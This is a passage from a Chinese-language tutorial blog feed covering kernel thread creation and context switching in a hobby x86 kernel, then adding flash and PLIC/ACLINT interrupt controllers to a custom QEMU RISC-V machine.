STACK_SIZE);</span><br><span class="line"></span><br><span class="line">    current-&gt;state = TASK_RUNNABLE;</span><br><span class="line">    current-&gt;pid = now_pid++;</span><br><span class="line">    current-&gt;<span class="built_in">stack</span> = current;</span><br><span class="line">    current-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 单向循环链表</span></span><br><span class="line">    current-&gt;next = current;</span><br><span class="line">    running_proc_head = current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>init&#x2F;entry.c 中加入 栈顶变量</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 栈顶</span></span><br><span class="line"><span class="type">uint32_t</span> kern_stack_top;</span><br></pre></td></tr></table></figure>



<p>调度函数实现，每次都返回当前任务的下一个任务  , 可以实现更复杂的调度函数</p>
<blockquote>
<p>kernel&#x2F;sched&#x2F;sched.c </p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">schedule</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (current) &#123;</span><br><span class="line">        change_task_to(current-&gt;next);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_task_to</span> <span class="params">(<span class="keyword">struct</span> task_struct *next)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current != next) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">prev</span> =</span> current;</span><br><span class="line">        current = next;</span><br><span class="line">        switch_to(&amp;(prev-&gt;context), &amp;(current-&gt;context)); <span class="comment">// 交换上下文切换 由汇编实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>由汇编实现上下文切换</p>
<blockquote>
<p>kernel&#x2F;sched&#x2F;switch_to.s</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global switch_to]</span><br><span class="line">;</span><br><span class="line">;具体的线程切换操作 寄存器的保护和恢复</span><br><span class="line">switch_to:</span><br><span class="line">        mov eax, [esp+4]</span><br><span class="line"></span><br><span class="line">        mov [eax+0],  esp</span><br><span class="line">        mov [eax+4],  ebp</span><br><span class="line">        mov [eax+8],  ebx</span><br><span class="line">        mov [eax+12], esi</span><br><span class="line">        mov [eax+16], edi</span><br><span class="line">        pushf</span><br><span class="line">        pop ecx</span><br><span class="line">        mov [eax+20], ecx</span><br><span class="line"></span><br><span class="line">        mov eax, [esp+8]</span><br><span class="line"></span><br><span class="line">        mov esp, [eax+0]</span><br><span class="line">        mov ebp, [eax+4]</span><br><span class="line">        mov ebx, [eax+8]</span><br><span class="line">        mov esi, [eax+12]</span><br><span class="line">        mov edi, [eax+16]</span><br><span class="line">        mov eax, [eax+20]</span><br><span class="line">        push eax</span><br><span class="line">        popf</span><br><span class="line"> 	</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>



<p>在ret指令返回之前，由于之前的执行现场已经被切换，特别是esp指针指向 的栈被切换了，所以ret指令弹出的返回地址自然就变成了另一个执行流之前调用任务切换 函数之前保存的返回地址了。<strong>kernel_thread函数便是通过构造出这样一个切换后可以弹 出执行地址的初始栈来实现的。</strong></p>
<p>内核线程的创建和 退出函数</p>
<blockquote>
<p>kernel&#x2F;task&#x2F;task.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;task.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sched.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局 pid 值</span></span><br><span class="line"><span class="type">pid_t</span> now_pid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核线程创建</span></span><br><span class="line"><span class="type">int32_t</span> <span class="title function_">kernel_thread</span><span class="params">(<span class="type">int</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">new_task</span> =</span> (<span class="keyword">struct</span> task_struct *)kmalloc(STACK_SIZE);</span><br><span class="line">	assert(new_task != <span class="literal">NULL</span>, <span class="string">&quot;kern_thread: kmalloc error&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 将栈低端结构信息初始化为 0 </span></span><br><span class="line">	bzero(new_task, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> task_struct));</span><br><span class="line"></span><br><span class="line">	new_task-&gt;state = TASK_RUNNABLE;</span><br><span class="line">	new_task-&gt;<span class="built_in">stack</span> = current;</span><br><span class="line">	new_task-&gt;pid = now_pid++;</span><br><span class="line">	new_task-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> *stack_top = (<span class="type">uint32_t</span> *)((<span class="type">uint32_t</span>)new_task + STACK_SIZE);</span><br><span class="line"></span><br><span class="line">	*(--stack_top) = (<span class="type">uint32_t</span>)arg;</span><br><span class="line">	*(--stack_top) = (<span class="type">uint32_t</span>)kthread_exit;</span><br><span class="line">	*(--stack_top) = (<span class="type">uint32_t</span>)fn;</span><br><span class="line"></span><br><span class="line">	new_task-&gt;context.esp = (<span class="type">uint32_t</span>)new_task + STACK_SIZE - <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>) * <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置新任务的标志寄存器未屏蔽中断，很重要</span></span><br><span class="line">	new_task-&gt;context.eflags = <span class="number">0x200</span>;</span><br><span class="line">	new_task-&gt;next = running_proc_head;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 找到当前的任务队列，插入到末尾</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tail</span> =</span> running_proc_head;</span><br><span class="line">	assert(tail != <span class="literal">NULL</span>, <span class="string">&quot;Must init sched!&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (tail-&gt;next != running_proc_head) &#123;</span><br><span class="line">		tail = tail-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	tail-&gt;next = new_task;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> new_task-&gt;pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kthread_exit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">register</span> <span class="type">uint32_t</span> val <span class="title function_">asm</span> <span class="params">(<span class="string">&quot;eax&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">	printk(<span class="string">&quot;Thread exited with value %d\n&quot;</span>, val);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>内核创建函数解析：</strong></p>
<p><strong>内核退出函数：</strong></p>
<p>内核退出函数在这里只实现了简陋的一部分，标准做法是将退出线程的PCB结构转移到 不可调度链表去，等待其他线程join后再清理结构。</p>
<p>时间片，修改timer.c函数</p>
<blockquote>
<p>drivers&#x2F;timers.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sched.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">timer_callback</span><span class="params">(pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">	schedule();	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>修改entry.c</p>
<blockquote>
<p>init&#x2F;entry.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sched.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;task.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (flag == <span class="number">1</span>) &#123;</span><br><span class="line">			printk_color(rc_black, rc_green, <span class="string">&quot;B&quot;</span>);</span><br><span class="line">			flag = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test_heap();</span><br><span class="line"></span><br><span class="line">	init_sched();</span><br><span class="line"></span><br><span class="line">	kernel_thread(thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 开启中断</span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;sti&quot;</span>)</span>;</span><br><span class="line">	<span class="comment">//enable_intr();</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (flag == <span class="number">0</span>) &#123;</span><br><span class="line">			printk_color(rc_black, rc_red, <span class="string">&quot;A&quot;</span>);</span><br><span class="line">			flag = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;hlt&quot;</span>)</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>通过中断实现线程切换的流程逻辑： 通过中断和简单的线程调度机制实现交替打印</p>
<ol>
<li>首先创建了一个内存线程thread函数，并且，初始化线程</li>
<li><code>init_timer(200)</code> 每200ms出发中断，，中断中进行系统调用</li>
<li><code>init_timer(200)</code>  —- <code>timecallback()</code> — <code>schedule()</code> — <code>change_task_to()更换线程</code> — <code>swicth_to()</code>进行上下文切换</li>
</ol>
<p><img src="/2024/05/21/x86-8-thread/image-20240521164433586.png" alt="image-20240521164433586"></p>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-2-flash-itr-gpio</title>
    <url>/2024/06/02/qemu-riscv-add-flash-itr-gpio/</url>
    <content><![CDATA[<h1 id="1-添加flash"><a href="#1-添加flash" class="headerlink" title="1.添加flash"></a>1.添加flash</h1><blockquote>
<p>这里加的是pflash意为并行flash。</p>
</blockquote>
<blockquote>
<p>include&#x2F;quard_star.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QuardStarState</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    MachineState parent;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">    RISCVHartArrayState soc[QUARD_STAR_SOCKETS_MAX];</span><br><span class="line">    PFlashCFI01 *flash;   <span class="comment">// FLASH</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    QUARD_STAR_MROM,</span><br><span class="line">    QUARD_STAR_SRAM,</span><br><span class="line">    QUARD_STAR_UART0,</span><br><span class="line">    QUARD_STAR_FLASH,  <span class="comment">// FLASH</span></span><br><span class="line">    QUARD_STAR_DRAM,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<blockquote>
<p>quard_star.c</p>
<p>定义flash的起始地址和大小 32M</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemMapEntry quard_star_memmap[] = &#123;</span><br><span class="line">    [QUARD_STAR_MROM]  = &#123;        <span class="number">0x0</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_SRAM]  = &#123;     <span class="number">0x8000</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART0] = &#123; <span class="number">0x10000000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_FLASH] = &#123; <span class="number">0x20000000</span>,     <span class="number">0x2000000</span> &#125;, <span class="comment">// 定义flash的起始地址和大小 32M</span></span><br><span class="line">    [QUARD_STAR_DRAM]  = &#123; <span class="number">0x80000000</span>,          <span class="number">0x80</span> &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<ul>
<li>创建pflash，并且映射到系统总线对应的地址上，最后将其关联 到qemu参数 <code>-drive if=pflash, bus = 0, uint  = 0</code></li>
<li>这样启动的时候就可以将固件文件加载到这 这篇flash上</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_flash_create</span><span class="params">(MchineState *machine)</span> </span>&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> QUARD_STAR_FLASH_SECTOR_SIZE (256 * KiB)</span></span><br><span class="line">    QuardStarState *s = <span class="built_in">RISCV_VIRT_MACHINE</span>(machine);</span><br><span class="line">    MemoryRegion *system_memory = <span class="built_in">get_system_memory</span>();</span><br><span class="line">    DeviceState *dev = <span class="built_in">qdev_new</span>(TYPE_PFLASH_CFI01);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 一些参数的 配置</span></span><br><span class="line">    <span class="built_in">qdev_prop_set_uint64</span>(dev, <span class="string">&quot;sector-length&quot;</span>, QUARD_STAR_FLASH_SECTOR_SIZE);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint8</span>(dev, <span class="string">&quot;width&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint8</span>(dev, <span class="string">&quot;device-width&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_bit</span>(dev, <span class="string">&quot;big-endian&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint16</span>(dev, <span class="string">&quot;id0&quot;</span>, <span class="number">0x89</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint16</span>(dev, <span class="string">&quot;id1&quot;</span>, <span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint16</span>(dev, <span class="string">&quot;id2&quot;</span>, <span class="number">0x00</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint16</span>(dev, <span class="string">&quot;id3&quot;</span>, <span class="number">0x00</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_string</span>(dev, <span class="string">&quot;name&quot;</span>,<span class="string">&quot;quard-star.flash0&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">object_property_add_child</span>(<span class="built_in">OBJECT</span>(s), <span class="string">&quot;quard-star.flash0&quot;</span>, <span class="built_in">OBJECT</span>(dev));</span><br><span class="line">    <span class="built_in">object_property_add_alias</span>(<span class="built_in">OBJECT</span>(s), <span class="string">&quot;pflash0&quot;</span>,</span><br><span class="line">                              <span class="built_in">OBJECT</span>(dev), <span class="string">&quot;drive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s-&gt;flash = <span class="built_in">PFLASH_CFI01</span>(dev);</span><br><span class="line">    <span class="built_in">pflash_cfi01_legacy_drive</span>(s-&gt;flash,<span class="built_in">drive_get</span>(IF_PFLASH, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    hwaddr flashsize = quard_star_memmap[QUARD_STAR_FLASH].size;</span><br><span class="line">    hwaddr flashbase = quard_star_memmap[QUARD_STAR_FLASH].base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(<span class="built_in">QEMU_IS_ALIGNED</span>(flashsize, QUARD_STAR_FLASH_SECTOR_SIZE));   <span class="comment">// 断言</span></span><br><span class="line">    <span class="built_in">assert</span>(flashsize / QUARD_STAR_FLASH_SECTOR_SIZE &lt;= UINT32_MAX);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint32</span>(dev, <span class="string">&quot;num-blocks&quot;</span>, flashsize / QUARD_STAR_FLASH_SECTOR_SIZE);</span><br><span class="line">    <span class="built_in">sysbus_realize_and_unref</span>(<span class="built_in">SYS_BUS_DEVICE</span>(dev), &amp;error_fatal);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memory_region_add_subregion</span>(system_memory, flashbase,</span><br><span class="line">                                <span class="built_in">sysbus_mmio_get_region</span>(<span class="built_in">SYS_BUS_DEVICE</span>(dev),</span><br><span class="line">                                                       <span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_machine_init</span><span class="params">(MachineState *machine)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//创建CPU</span></span><br><span class="line">   quard_star_cpu_create(machine);</span><br><span class="line">   <span class="comment">// 创建主存</span></span><br><span class="line">   quard_star_memory_create(machine);</span><br><span class="line">   <span class="comment">// flash</span></span><br><span class="line">   quard_star_flash_create(machine);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>修改quard_star_setup_rom_reset_vec函数中bootrom的跳转地址为pflash上的地址。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">riscv_setup_rom_reset_vec(machine, &amp;s-&gt;soc[<span class="number">0</span>], </span><br><span class="line">                              quard_star_memmap[QUARD_STAR_FLASH].base,</span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].base,</span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].size,</span><br><span class="line">                              <span class="number">0x0</span>, <span class="number">0x0</span>);</span><br></pre></td></tr></table></figure>



<blockquote>
<p>Kconfig 新增flash 设备</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">config QUARD_STAR</span><br><span class="line">    <span class="type">bool</span></span><br><span class="line">    select SERIAL</span><br><span class="line">    select PFLASH_CFI01 <span class="comment">// flash</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>测试</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./build.sh</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/qemu-riscv-add-flash-itr-gpio/image-20240602224916448.png" alt="image-20240602224916448"></p>
<h1 id="2-中断控制器"><a href="#2-中断控制器" class="headerlink" title="2.中断控制器"></a>2.中断控制器</h1><p>串口使用需要使用到中断，后续的一些外设也有需求 这里使用 <code>sifive</code></p>
<blockquote>
<p>quard_star.c 增加基址</p>
<p>riscv的中断分为两个部分，<strong>为内核中断CLINT(Core Local Interrupt)和外设中断控制器Platform-Level Interrupt Controller(PLIC)</strong></p>
</blockquote>
<p>plic 和 clint 基址的增加 以及相应发分配大小</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemMapEntry quard_star_memmap[] = &#123;</span><br><span class="line">    [QUARD_STAR_MROM]  = &#123;        <span class="number">0x0</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_SRAM]  = &#123;     <span class="number">0x8000</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_CLINT] = &#123; <span class="number">0x02000000</span>,       <span class="number">0x10000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_PLIC]  = &#123; <span class="number">0x0C000000</span>,     <span class="number">0x4000000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART0] = &#123; <span class="number">0x10000000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_FLASH] = &#123; <span class="number">0x20000000</span>,     <span class="number">0x2000000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_DRAM]  = &#123; <span class="number">0x80000000</span>,          <span class="number">0x80</span> &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<ul>
<li>分别新建CLINT 和 PLIC 创建函数， plic 在循环中遍历所有的socket ， 每个socket需要配置独立的PLIC来管理中断请求</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// plic</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_plic_create</span><span class="params">(MachineState *machine)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> socket_count = riscv_socket_count(machine);</span><br><span class="line">    QuardStarState *s = RISCV_VIRT_MACHINE(machine);</span><br><span class="line">    <span class="type">int</span> i,hart_count,base_hartid;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; socket_count; i++) &#123;</span><br><span class="line">    </span><br><span class="line">        hart_count = riscv_socket_hart_count(machine, i);</span><br><span class="line">        base_hartid = riscv_socket_first_hartid(machine, i);</span><br><span class="line">        <span class="type">char</span> *plic_hart_config;</span><br><span class="line">        <span class="comment">/* Per-socket PLIC hart topology configuration string */</span></span><br><span class="line">        plic_hart_config = riscv_plic_hart_config_string(machine-&gt;smp.cpus);</span><br><span class="line">        </span><br><span class="line">        s-&gt;plic[i] = sifive_plic_create(</span><br><span class="line">            quard_star_memmap[QUARD_STAR_PLIC].base + i *quard_star_memmap[QUARD_STAR_PLIC].size ,</span><br><span class="line">            plic_hart_config, hart_count , base_hartid,</span><br><span class="line">            QUARD_STAR_PLIC_NUM_SOURCES,</span><br><span class="line">            QUARD_STAR_PLIC_NUM_PRIORITIES,</span><br><span class="line">            QUARD_STAR_PLIC_PRIORITY_BASE,</span><br><span class="line">            QUARD_STAR_PLIC_PENDING_BASE,</span><br><span class="line">            QUARD_STAR_PLIC_ENABLE_BASE,</span><br><span class="line">            QUARD_STAR_PLIC_ENABLE_STRIDE,</span><br><span class="line">            QUARD_STAR_PLIC_CONTEXT_BASE,</span><br><span class="line">            QUARD_STAR_PLIC_CONTEXT_STRIDE,</span><br><span class="line">            quard_star_memmap[QUARD_STAR_PLIC].size);</span><br><span class="line">        g_free(plic_hart_config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>这也同理 每个CPU 都需要独立的clint来处理中断请求</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_aclint_create</span><span class="params">(MachineState *machine)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i , hart_count,base_hartid;</span><br><span class="line">    <span class="type">int</span> socket_count = riscv_socket_count(machine);</span><br><span class="line">    <span class="comment">//每个CPU都需要创建 aclint</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; socket_count; i++) &#123;</span><br><span class="line"></span><br><span class="line">        base_hartid = riscv_socket_first_hartid(machine, i);</span><br><span class="line">        hart_count = riscv_socket_hart_count(machine, i);</span><br><span class="line"></span><br><span class="line">        riscv_aclint_swi_create(</span><br><span class="line">        quard_star_memmap[QUARD_STAR_CLINT].base + i 			*quard_star_memmap[QUARD_STAR_CLINT].size,</span><br><span class="line">        base_hartid, hart_count, <span class="literal">false</span>);</span><br><span class="line">        riscv_aclint_mtimer_create(quard_star_memmap[QUARD_STAR_CLINT].base +</span><br><span class="line">             + i *quard_star_memmap[QUARD_STAR_CLINT].size+ RISCV_ACLINT_SWI_SIZE,</span><br><span class="line">            RISCV_ACLINT_DEFAULT_MTIMER_SIZE, base_hartid, hart_count,</span><br><span class="line">            RISCV_ACLINT_DEFAULT_MTIMECMP, RISCV_ACLINT_DEFAULT_MTIME,</span><br><span class="line">            RISCV_ACLINT_DEFAULT_TIMEBASE_FREQ, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>函数初始化加上两个函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_machine_init</span><span class="params">(MachineState *machine)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//创建CPU</span></span><br><span class="line">   quard_star_cpu_create(machine);</span><br><span class="line">   <span class="comment">// 创建主存</span></span><br><span class="line">   quard_star_memory_create(machine);</span><br><span class="line">   <span class="comment">// flash</span></span><br><span class="line">   quard_star_flash_create(machine);</span><br><span class="line">   <span class="comment">// PLIC</span></span><br><span class="line">   quard_star_plic_create(machine);</span><br><span class="line">   <span class="comment">// clint</span></span><br><span class="line">   quard_star_aclint_create(machine);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>include&#x2F;quard_star.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QuardStarState</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    MachineState parent;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">    RISCVHartArrayState soc[QUARD_STAR_SOCKETS_MAX];</span><br><span class="line">    PFlashCFI01 *flash;</span><br><span class="line">    DeviceState *plic[QUARD_STAR_SOCKETS_MAX];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    QUARD_STAR_MROM,</span><br><span class="line">    QUARD_STAR_SRAM,</span><br><span class="line">    QUARD_STAR_CLINT,</span><br><span class="line">    QUARD_STAR_PLIC,</span><br><span class="line">    QUARD_STAR_UART0,</span><br><span class="line">    QUARD_STAR_FLASH,</span><br><span class="line">    QUARD_STAR_DRAM,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_NUM_SOURCES     127      <span class="comment">// 中断的最大数量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_NUM_PRIORITIES  7        <span class="comment">// 支持中断优先级的数量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_PRIORITY_BASE   0x04     <span class="comment">// 中断优先级寄存器的基址  用于访问中断优先级信息</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_PENDING_BASE    0x1000   <span class="comment">// 挂起寄存器的基址     用于访问挂起状态</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_ENABLE_BASE     0x2000   <span class="comment">// 使能   用于访问使能状态</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_ENABLE_STRIDE   0x80     <span class="comment">// 中断使能寄存器中间的地址间隔</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_CONTEXT_BASE    0x200000 <span class="comment">// 上下文保存寄存器 基址  用于保存中断处理程序的上下文信息</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_CONTEXT_STRIDE  0x1000   <span class="comment">// 地址间隔</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<blockquote>
<p>Kconfig</p>
<h3 id="select-RISCV-APLIC"><a href="#select-RISCV-APLIC" class="headerlink" title="select RISCV_APLIC"></a><code>select RISCV_APLIC</code></h3><ul>
<li><strong>RISCV_APLIC</strong>：通常表示支持 RISC-V 规范中定义的高级平台级中断控制器（Advanced Platform-Level Interrupt Controller）。APLIC 是 RISC-V 的一种更通用或高级的中断控制器实现，可能包含一些标准功能，用于在多个 RISC-V 实现中使用。</li>
</ul>
<h3 id="select-SIFIVE-PLIC"><a href="#select-SIFIVE-PLIC" class="headerlink" title="select SIFIVE_PLIC"></a><code>select SIFIVE_PLIC</code></h3><ul>
<li><strong>SIFIVE_PLIC</strong>：特指 SiFive 公司的 PLIC 实现。SiFive 是一家专注于 RISC-V 处理器设计的公司，他们的 PLIC 可能有一些特定于他们硬件的功能或优化。选择这个配置选项表示启用 SiFive PLIC 的支持。</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">config QUARD_STAR</span><br><span class="line">    <span class="type">bool</span></span><br><span class="line">    select SERIAL</span><br><span class="line">    select PFLASH_CFI01</span><br><span class="line">    select RISCV_ACLINT</span><br><span class="line">    select RISCV_APLIC</span><br><span class="line">    select SIFIVE_PLIC </span><br></pre></td></tr></table></figure>



<ul>
<li>测试</li>
</ul>
<blockquote>
